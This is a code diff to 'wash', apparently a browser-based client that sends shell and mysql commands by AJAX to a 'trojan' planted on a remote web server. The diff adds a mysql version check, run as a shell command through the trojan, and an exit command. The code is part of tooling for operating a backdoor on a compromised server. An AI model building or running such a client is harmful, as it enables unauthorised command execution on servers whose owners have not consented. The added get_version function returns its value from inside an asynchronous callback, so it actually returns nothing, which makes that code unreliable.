@@ -27,9 +27,12 @@ wash.mysql = {
         wash.mysql.connection.password = connection_parameters.password;
         wash.mysql.connection.database = connection_parameters.database;
 
+        // get the mysql version information
+        var version_info = wash.mysql.get_version();
+
         // visually signify that we're entering an emulated session
         $('body').animate({ backgroundColor : '#E97B00' }, 500);
-        shell.status.set('Emulating mysql client.');
+        shell.status.set('Emulating mysql client. (' + version_info + ')');
 
         // buffer the previous session's settings
         wash.mysql.old_objects.prompt = shell.prompt.context.get();
@@ -54,6 +57,11 @@ wash.mysql = {
                 }catch(e){
                     shell.output.write('wash error: Invalid command.', 'output wash_error');
                 }
+            }
+
+            // support the exit command
+            else if(command == 'exit' || command == 'exit;'){
+                wash.mysql.disconnect();
             }
             
             // if the prompt is not in wash mode, default to mysql action
@@ -117,6 +125,28 @@ wash.mysql = {
         wash.command.action = 'shell';
         wash.command.cmd    = cmd;
         wash.mysql.send_and_receive();
+    },
+
+    // returns mysql client version information
+    get_version: function(){
+        // assemble the command to send to the trojan
+        wash.command.action = 'shell';
+        wash.command.cmd    = 'mysql -V';
+        wash.command.args   = {} ;
+
+        // make the AJAX request to the trojan
+        // @todo: manage crypto here
+        $.ajax({
+            type : wash.connection.request_type,
+            url  : wash.connection.protocol + '://' + wash.connection.domain + wash.connection.url,
+            data : wash.command,
+        }).done(function(response){
+            // @todo: manage crypto here
+        
+            // parse the JSON response
+            wash.response = JSON.parse(response);
+            return wash.response.output;
+        });
     },
 
     // @see: wash.send_and_receive(). We just need slightly
